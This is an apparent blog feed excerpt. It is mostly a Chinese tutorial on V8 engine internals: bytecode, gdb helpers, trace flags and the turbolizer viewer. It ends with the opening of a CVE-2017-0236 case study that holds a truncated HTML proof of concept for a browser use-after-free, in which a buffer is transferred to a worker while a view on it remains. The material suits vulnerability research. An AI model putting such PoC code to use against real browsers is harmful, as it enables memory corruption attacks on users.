ElementsAccessor</h3><p>你可以想到开发人员根本不愿意为这20种元素在C++中对应重复写20遍数组方法。这里就是体现C++神奇的地方了。为了不实现数组方法一遍又一遍，我们建立了一个属性存取器（ElementsAccessor），在它里面大部分都仅仅是简单的属性访问相关的方法。这个属性访问其依赖C++中的CRTP来实现不同种类需求的数组方法。所以，有时如果我们调用例如数组的slice，V8会调用C++中的代码，然后通过属性存取器来选择所需函数，如slice的专门版本。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-090501.jpg" alt=""></p><h2 id="学习v8字节码"><a href="#学习v8字节码" class="headerlink" title="学习v8字节码"></a>学习v8字节码</h2><h3 id="阅读和打印（只是个例子）"><a href="#阅读和打印（只是个例子）" class="headerlink" title="阅读和打印（只是个例子）"></a>阅读和打印（只是个例子）</h3><p><code>./d8 --print-bytecode test.js</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function incrementX(obj) &#123;</span><br><span class="line">  return 1 + obj.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">incrementX(&#123;x: 42&#125;);</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$ node --print-bytecode incrementX.js</span><br><span class="line">...</span><br><span class="line">[generating bytecode for function: incrementX]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 8</span><br><span class="line">  12 E&gt; 0x2ddf8802cf6e @    StackCheck</span><br><span class="line">  19 S&gt; 0x2ddf8802cf6f @    LdaSmi [1]</span><br><span class="line">        0x2ddf8802cf71 @    Star r0</span><br><span class="line">  34 E&gt; 0x2ddf8802cf73 @    LdaNamedProperty a0, [0], [4]</span><br><span class="line">  28 E&gt; 0x2ddf8802cf77 @    Add r0, [6]</span><br><span class="line">  36 S&gt; 0x2ddf8802cf7a @    Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x2ddf8802cf21: [FixedArray] in OldSpace</span><br><span class="line"> - map = 0x2ddfb2d02309 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br><span class="line">Handler Table (size = 16)</span><br></pre></td></tr></table></figure></p><ul><li>LdaSmi [1]<br>LdaSmi [1]将常量 1 加载到累加器中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144516.jpg" alt=""></li><li>Star r0<br>接下来，Star r0 将当前在累加器中的值 1 存储在寄存器 r0 中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145501.jpg" alt=""></li><li>LdaNamedProperty a0, [0], [4]<br>LdaNamedProperty 将 a0 的命名属性加载到累加器中。ai 指向 incrementX() 的第 i 个参数。在这个例子中，我们在 a0 上查找一个命名属性，这是 incrementX() 的第一个参数。该属性名由常量 0 确定。LdaNamedProperty 使用 0 在单独的表中查找名称：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br></pre></td></tr></table></figure></li></ul><p>可以看到，0 映射到了 x。因此这行字节码的意思是加载 obj.x。<br>那么值为 4 的操作数是干什么的呢？ 它是函数 incrementX() 的反馈向量的索引。反馈向量包含用于性能优化的 runtime 信息。<br>现在寄存器看起来是这样的：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145844.jpg" alt=""></p><ul><li><p>Add r0, [6]<br>最后一条指令将 r0 加到累加器，结果是 43。 6 是反馈向量的另一个索引。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145912.jpg" alt=""></p></li><li><p>Return<br>Return 返回累加器中的值。返回语句是函数 incrementX() 的结束。此时 incrementX() 的调用者可以在累加器中获得值 43，并可以进一步处理此值。</p></li></ul><p>乍一看，V8 的字节码看起来非常奇怪，特别是当我们打印出所有的额外信息。但是一旦你知道 Ignition 是一个带有累加器寄存器的寄存器，你就可以分析出大多数字节码都干了什么。</p><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-152050.png" alt=""></li></ul><h2 id="v8自带的gdb命令"><a href="#v8自带的gdb命令" class="headerlink" title="v8自带的gdb命令"></a>v8自带的gdb命令</h2><p>在/tools中可以找到gdbinit和gdb-v8-support.py<br>我将其都复制到调试路径下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ls | grep gdb</span><br><span class="line">gdbinit</span><br><span class="line">gdb-v8-support.py</span><br></pre></td></tr></table></figure></p><p>对如下代码进行测试<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">"hoge"</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ source gdbinit</span><br><span class="line">gdb-peda$ source gdb-v8-support.py </span><br><span class="line">gdb-peda$ find 0xdeadbee</span><br><span class="line">Searching for &apos;0xdeadbee&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">mapped : 0x5e88e28c6c4 --&gt; 0x7daafaa10deadbee </span><br><span class="line">   </span><br><span class="line">gdb-peda$ v8print 0x5e88e28c6c4-0x14+1</span><br><span class="line">0x5e88e28c6b1: [FixedArray]</span><br><span class="line"> - map = 0x2702dbb82679 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 233495534</span><br><span class="line">           1: 0x318d7daafaa1 &lt;Number 3.73593e+09&gt;</span><br><span class="line">           2: 0x318d7daafa81 &lt;String[4]: hoge&gt;</span><br><span class="line">gdb-peda$ v8print *(void **)(0x5e88e28c6c4-0x14)</span><br><span class="line">0x2702dbb82679: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x504a7702311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x504a7702231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><h2 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h2><h3 id="print-flag"><a href="#print-flag" class="headerlink" title="print flag"></a>print flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --help |grep print</span><br><span class="line">  --print_bytecode (print bytecode generated by ignition interpreter)</span><br><span class="line">  --print_bytecode_filter (filter for selecting which functions to print bytecode)</span><br><span class="line">  --hydrogen_stats (print statistics for hydrogen)</span><br><span class="line">  --print_deopt_stress (print number of possible deopt points)</span><br><span class="line">  --turbo_stats (print TurboFan statistics)</span><br><span class="line">  --turbo_stats_nvp (print TurboFan statistics in machine-readable format)</span><br><span class="line">  --print_wasm_code (Print WebAssembly code)</span><br><span class="line">  --trace_gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace_gc_nvp (print one detailed trace line in name=value format after each garbage collection)</span><br><span class="line">  --trace_gc_ignore_scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace_idle_notification (print one trace line following each idle notification)</span><br><span class="line">  --trace_idle_notification_verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace_gc_verbose (print more details following each garbage collection)</span><br><span class="line">  --trace_allocation_stack_interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace_mutator_utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace_codegen (print name of functions for which code is generated)</span><br><span class="line">  --trace_serializer (print code serializer trace)</span><br><span class="line">  --external_reference_stats (print statistics on external references used during serialization)</span><br><span class="line">  --trace_side_effect_free_debug_evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max_stack_trace_source_length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --trace_object_groups (print object groups detected during each garbage collection)</span><br><span class="line">  --use_idle_notification (Use idle notification to reduce memory footprint.)</span><br><span class="line">  --use_verbose_printer (allows verbose printing)</span><br><span class="line">  --log_regs_modified (When logging register values, only print modified registers.)</span><br><span class="line">  --stack_trace_on_illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --print_all_exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --print_ast (print source AST)</span><br><span class="line">  --print_builtin_ast (print source AST for builtins)</span><br><span class="line">  --print_builtin_scopes (print scopes for builtins)</span><br><span class="line">  --print_scopes (print scopes)</span><br><span class="line">  --gc_verbose (print stuff during garbage collection)</span><br><span class="line">  --print_handles (report handles after GC)</span><br><span class="line">  --print_global_handles (report global handles after GC)</span><br><span class="line">  --print_turbo_replay (print C++ code to recreate TurboFan graphs)</span><br><span class="line">  --trace_normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --print_break_location (print source location on debug break)</span><br><span class="line">  --print_opt_source (print source code of optimized and inlined functions)</span><br><span class="line">  --print_code_stubs (print code stubs)</span><br><span class="line">  --print_code (print generated code)</span><br><span class="line">  --print_opt_code (print optimized code)</span><br><span class="line">  --print_opt_code_filter (filter for printing optimized code)</span><br><span class="line">  --print_unopt_code (print unoptimized code before printing optimized code based on it)</span><br><span class="line">  --print_code_verbose (print more information for code)</span><br><span class="line">  --print_builtin_code (print generated code for builtins)</span><br><span class="line">  --sodium (print generated code output suitable for use with the Sodium code viewer)</span><br><span class="line">  --print_all_code (enable all flags related to printing code)</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~/v8/v8/out.gn/x64.debug$ ./d8 --help | grep trace</span><br><span class="line">  --trace-pretenuring (trace pretenuring decisions of HAllocate instructions)</span><br><span class="line">  --trace-pretenuring-statistics (trace allocation site pretenuring statistics)</span><br><span class="line">  --trace-block-coverage (trace collected block coverage information)</span><br><span class="line">  --trace-ignition-codegen (trace the codegen of ignition interpreter bytecode handlers)</span><br><span class="line">  --trace-ignition-dispatches (traces the dispatches to bytecode handlers by the ignition interpreter)</span><br><span class="line">  --trace-ignition-dispatches-output-file (the file to which the bytecode handler dispatch table is written (by default, the table is not written to a file))</span><br><span class="line">  --trace-track-allocation-sites (trace the tracking of allocation sites)</span><br><span class="line">  --trace-migration (trace object migration)</span><br><span class="line">  --trace-generalization (trace map generalization)</span><br><span class="line">  --trace-concurrent-recompilation (track concurrent recompilation)</span><br><span class="line">  --trace-turbo (trace generated TurboFan IR)</span><br><span class="line">  --trace-turbo-path (directory to dump generated TurboFan IR to)</span><br><span class="line">  --trace-turbo-filter (filter for tracing turbofan compilation)</span><br><span class="line">  --trace-turbo-graph (trace generated TurboFan graphs)</span><br><span class="line">  --trace-turbo-scheduled (trace TurboFan IR with schedule)</span><br><span class="line">  --trace-turbo-cfg-file (trace turbo cfg graph (for C1 visualizer) to a given file name)</span><br><span class="line">  --trace-turbo-types (trace TurboFan&apos;s types)</span><br><span class="line">  --trace-turbo-scheduler (trace TurboFan&apos;s scheduler)</span><br><span class="line">  --trace-turbo-reduction (trace TurboFan&apos;s various reducers)</span><br><span class="line">  --trace-turbo-trimming (trace TurboFan&apos;s graph trimmer)</span><br><span class="line">  --trace-turbo-jt (trace TurboFan&apos;s jump threading)</span><br><span class="line">  --trace-turbo-ceq (trace TurboFan&apos;s control equivalence)</span><br><span class="line">  --trace-turbo-loop (trace TurboFan&apos;s loop optimizations)</span><br><span class="line">  --trace-alloc (trace register allocator)</span><br><span class="line">  --trace-all-uses (trace all use positions)</span><br><span class="line">  --trace-representation (trace representation types)</span><br><span class="line">  --trace-verify-csa (trace code stubs verification)</span><br><span class="line">  --trace-turbo-inlining (trace TurboFan inlining)</span><br><span class="line">  --trace-osr (trace on-stack replacement)</span><br><span class="line">  --trace-environment-liveness (trace liveness of local variable slots)</span><br><span class="line">  --trace-turbo-load-elimination (trace TurboFan load elimination)</span><br><span class="line">  --trace-store-elimination (trace store elimination)</span><br><span class="line">  --wasm-trace-native-heap (trace wasm native heap events)</span><br><span class="line">  --wasm-trace-serialization (trace serialization/deserialization)</span><br><span class="line">  --trace-wasm-decoder (trace decoding of wasm code)</span><br><span class="line">  --trace-wasm-decode-time (trace decoding time of wasm code)</span><br><span class="line">  --trace-wasm-compiler (trace compiling of wasm code)</span><br><span class="line">  --trace-wasm-interpreter (trace interpretation of wasm code)</span><br><span class="line">  --trace-wasm-streaming (trace streaming compilation of wasm code)</span><br><span class="line">  --trace-wasm-ast-start (start function for wasm AST trace (inclusive))</span><br><span class="line">  --trace-wasm-ast-end (end function for wasm AST trace (exclusive))</span><br><span class="line">  --trace-liftoff (trace Liftoff, the baseline compiler for WebAssembly)</span><br><span class="line">  --wasm-trace-memory (print all memory updates performed in wasm code)</span><br><span class="line">  --trace-asm-time (log asm.js timing info to the console)</span><br><span class="line">  --trace-asm-scanner (log tokens encountered by asm.js scanner)</span><br><span class="line">  --trace-asm-parser (verbose logging of asm.js parse failures)</span><br><span class="line">  --trace-wasm-lazy-compilation (trace lazy compilation of wasm functions)</span><br><span class="line">  --trace-gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace-gc-nvp (print one detailed trace line in name=value format after each garbage collection)</span><br><span class="line">  --trace-gc-ignore-scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace-idle-notification (print one trace line following each idle notification)</span><br><span class="line">  --trace-idle-notification-verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace-gc-verbose (print more details following each garbage collection)</span><br><span class="line">  --trace-allocation-stack-interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace-duplicate-threshold-kb (print duplicate objects in the heap if their size is more than given threshold)</span><br><span class="line">  --trace-fragmentation (report fragmentation for old space)</span><br><span class="line">  --trace-fragmentation-verbose (report fragmentation for old space (detailed))</span><br><span class="line">  --trace-evacuation (report evacuation statistics)</span><br><span class="line">  --trace-mutator-utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace-unmapper (Trace the unmapping)</span><br><span class="line">  --trace-parallel-scavenge (trace parallel scavenge)</span><br><span class="line">  --trace-concurrent-marking (trace concurrent marking)</span><br><span class="line">  --trace-incremental-marking (trace progress of the incremental marking)</span><br><span class="line">  --trace-stress-marking (trace stress marking progress)</span><br><span class="line">  --trace-stress-scavenge (trace stress scavenge progress)</span><br><span class="line">  --trace-gc-object-stats (trace object counts and memory usage)</span><br><span class="line">  --trace-zone-stats (trace zone memory usage)</span><br><span class="line">  --trace-detached-contexts (trace native contexts that are expected to be garbage collected)</span><br><span class="line">  --stack-trace-limit (number of stack frames to capture)</span><br><span class="line">  --builtins-in-stack-traces (show built-in functions in stack traces)</span><br><span class="line">  --trace (trace function calls)</span><br><span class="line">  --trace-opt (trace lazy optimization)</span><br><span class="line">  --trace-opt-verbose (extra verbose compilation tracing)</span><br><span class="line">  --trace-opt-stats (trace lazy optimization statistics)</span><br><span class="line">  --trace-deopt (trace optimize function deoptimization)</span><br><span class="line">  --trace-file-names (include file names in trace-opt/trace-deopt output)</span><br><span class="line">  --trace-interrupts (trace interrupts when they are handled)</span><br><span class="line">  --trace-serializer (print code serializer trace)</span><br><span class="line">  --trace-compiler-dispatcher (trace compiler dispatcher activity)</span><br><span class="line">  --trace-compiler-dispatcher-jobs (trace progress of individual jobs managed by the compiler dispatcher)</span><br><span class="line">  --trace-js-array-abuse (trace out-of-bounds accesses to JS arrays)</span><br><span class="line">  --trace-external-array-abuse (trace out-of-bounds-accesses to external arrays)</span><br><span class="line">  --trace-array-abuse (trace out-of-bounds accesses to all arrays)</span><br><span class="line">  --trace-side-effect-free-debug-evaluate (print debug messages for side-effect-free debug-evaluate for testing)</span><br><span class="line">  --max-stack-trace-source-length (maximum length of function source code printed in a stack trace.)</span><br><span class="line">  --heap-profiler-trace-objects (Dump heap object allocations/movements/size_updates)</span><br><span class="line">  --trace-ic (trace inline cache state transitions for tools/ic-processor)</span><br><span class="line">  --trace-prototype-users (Trace updates to prototype user tracking)</span><br><span class="line">  --trace-for-in-enumerate (Trace for-in enumerate slow-paths)</span><br><span class="line">  --trace-maps (trace map creation)</span><br><span class="line">  --trace-maps-details (also log map details)</span><br><span class="line">  --trace-sim (Trace simulator execution)</span><br><span class="line">  --trace-sim-messages (Trace simulator debug messages. Implied by --trace-sim.)</span><br><span class="line">  --stack-trace-on-illegal (print stack trace when an illegal exception is thrown)</span><br><span class="line">  --trace-rail (trace RAIL mode)</span><br><span class="line">  --print-all-exceptions (print exception object and stack trace on each thrown exception)</span><br><span class="line">  --trace-lazy-deserialization (Trace lazy deserialization.)</span><br><span class="line">  --trace-minor-mc-parallel-marking (trace parallel marking for the young generation)</span><br><span class="line">  --trace-contexts (trace contexts operations)</span><br><span class="line">  --trace-turbo-escape (enable tracing in escape analysis)</span><br><span class="line">  --trace-module-status (Trace status transitions of ECMAScript modules)</span><br><span class="line">  --trace-normalization (prints when objects are turned into dictionaries.)</span><br><span class="line">  --trace-lazy (trace lazy compilation)</span><br><span class="line">  --trace-isolates (trace isolate state changes)</span><br><span class="line">  --trace-regexp-bytecodes (trace regexp bytecode execution)</span><br><span class="line">  --trace-regexp-assembler (trace regexp macro assembler calls.)</span><br><span class="line">  --trace-regexp-parser (trace regexp parsing)</span><br><span class="line">  --trace-wasm-instances (trace creation and collection of wasm instances)</span><br><span class="line">  --redirect-code-traces (output deopt information and disassembly into file code-&lt;pid&gt;-&lt;isolate id&gt;.asm)</span><br><span class="line">  --redirect-code-traces-to (output deopt information and disassembly into the given file)</span><br><span class="line">  --trace-elements-transitions (trace elements transitions)</span><br><span class="line">  --trace-creation-allocation-sites (trace the creation of allocation sites)</span><br></pre></td></tr></table></figure><h3 id="IR可视化工具-turbolizer"><a href="#IR可视化工具-turbolizer" class="headerlink" title="IR可视化工具:turbolizer"></a>IR可视化工具:turbolizer</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~/Desktop/v8/tools/turbolizer$ npm i</span><br><span class="line">up to date in 2.01s</span><br><span class="line">sakura@sakuradeMacBook-Pro:~/Desktop/v8/tools/turbolizer$ npm run-script build</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162521.png" alt=""></p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>生成的在build目录下，如图<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162603.png" alt=""><br>然后在turbolizer目录下启动服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure></p><p>打开Chrome浏览器，注意一件事情，那就是这东西十分不好用……他对浏览器兼容适配很不好，Chrome勉强能用，提示无效的json文件就刷新几下看看……<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-162824.png" alt=""><br>选择输入文件。<br>这里的输入文件是来源于–trace-turbo这个flag生成的json文件。<br>我举个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>) </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">add(<span class="number">23</span>, <span class="number">44</span>);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">88</span>);</span><br><span class="line">%OptimizeFunctionOnNextCall(add);</span><br><span class="line">add(<span class="number">2</span>, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163131.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax --trace-turbo test.js --trace-turbo-path /Users/sakura/Desktop/tur</span><br></pre></td></tr></table></figure><p>–allow-natives-syntax是用来开启%OptimizeFunctionOnNextCall(add)标志的<br>–trace-turbo是trace TurboFan优化阶段，生成json文件<br>–trace-turbo-path 指定输出json的目录</p><p>然后上传上去就可以选择阶段和可视化的看IR了~<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163439.png" alt=""><br>因为这个工具的一些兼容关系，你可能需要自己改一下html，比如我就是height太小（原本25px，逗我……）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-01-163642.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-hidden-class-test&quot;&gt;&lt;a href=&quot;#v8-hidden-class-test&quot; class=&quot;headerlink&quot; title=&quot;v8 hidden class test&quot;&gt;&lt;/a&gt;v8 hidden class test&lt;/h2&gt;&lt;
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>case study:cve-2017-0236</title>
    <link href="http://eternalsakura13.com/2018/07/25/cve-2017-0236/"/>
    <id>http://eternalsakura13.com/2018/07/25/cve-2017-0236/</id>
    <published>2018-07-24T17:41:59.440Z</published>
    <updated>2018-10-22T14:25:51.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul><li><a href="ed2k://|file|cn_windows_10_multiple_editions_version_1607_updated_jan_2017_x64_dvd_9714394.iso|4747692032|27841B07666580185078EE62915191A1|/" target="_blank" rel="noopener">Windows 10 (Multiple Editions), Version 1607</a></li><li><a href="https://developer.microsoft.com/en-US/windows/downloads/windows-10-sdk" target="_blank" rel="noopener">Debugging Tools for Windows 10 (WinDbg)</a></li><li><a href="https://github.com/SkyLined/EdgeDbg" target="_blank" rel="noopener">EdgeDbg</a></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>PoC如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Math</span>.cosh.call([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])<span class="comment">//--&gt;和vul无关，只是测试用</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'uaf1.js'</span>);</span></span><br><span class="line"><span class="undefined">worker.postMessage(buffer,[buffer]);</span></span><br><span class="line"><span 